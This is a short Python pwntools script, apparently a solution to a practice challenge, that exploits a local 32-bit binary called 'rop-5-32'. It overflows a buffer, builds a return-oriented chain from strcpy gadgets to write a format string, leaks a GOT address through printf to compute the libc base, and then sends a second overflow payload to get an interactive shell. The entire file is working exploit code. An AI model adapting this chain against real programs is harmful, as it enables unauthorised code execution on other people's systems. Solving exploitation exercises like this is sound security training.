from pwn import *
s = p32(0x8049284)
per = p32(0x804961e)
p = p32(0x804927e)
zero = p32(0x8049280)
nl = p32(0x8049621)
x= p32(0x80496a3)
strcpy = p32(0x080484d3)
got = p32(0x0804a00d)
printf = p32(0x8048370)
addr = 0x0804a028
pop = p32(0x080485da)
puts = p32(0x8048380)
inp = p32(0x0804850a)
payload = "A"*140 + strcpy  +pop + p32(addr)  + nl + strcpy + pop + p32(addr+1) + nl + strcpy + pop + p32(addr+2) + per + strcpy + pop + p32(addr + 3)  + s + strcpy + pop + p32(addr+4) + nl + strcpy + pop + p32(addr+5) + zero + printf + pop+ p32(addr)+  got+ strcpy + pop + p32(addr+4) + zero + inp

with open("x", "w") as x:
    x.write(payload)

p = process("./rop-5-32")
p.recv(timeout = 1)
p.sendline(payload)
p.recvuntil("\n\n\n")
x = p.recvline(timeout = 1)
print repr(x)
x ="\x00"+ x[-4:-1]
x = u32(x)
print(hex(x))
x = x - 0x36e10
print repr(p32(x))
p.sendline("a"*140 + p32(x) + "AAAA" + p32(addr+3) + "\x00"*8)
print p.recv(timeout = 1)
p.interactive()
